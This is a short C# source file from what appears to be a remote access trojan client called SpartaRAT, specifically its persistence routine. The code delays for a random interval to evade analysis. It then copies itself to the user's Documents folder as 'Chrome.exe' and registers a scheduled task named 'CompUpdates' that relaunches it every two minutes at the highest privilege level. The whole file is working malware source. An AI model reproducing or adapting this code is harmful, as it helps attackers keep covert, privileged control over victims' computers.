using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public void Create()
        {
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(450_000, 500_000));

            if (!RegistryCheck.CheckIfExist("HaveTaskSchedulerItem"))
            {
                FileCopy.This();

                string NewCurrentProgramPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
                Shell PowershellCommand = new Shell();
                PowershellCommand.Run("schtasks /create /sc minute /mo 2 /tn CompUpdates /tr \"" + NewCurrentProgramPath + "\" /rl HIGHEST");

                RegistryCreate.Create("HaveTaskSchedulerItem", "");
            }
        }
    }
}
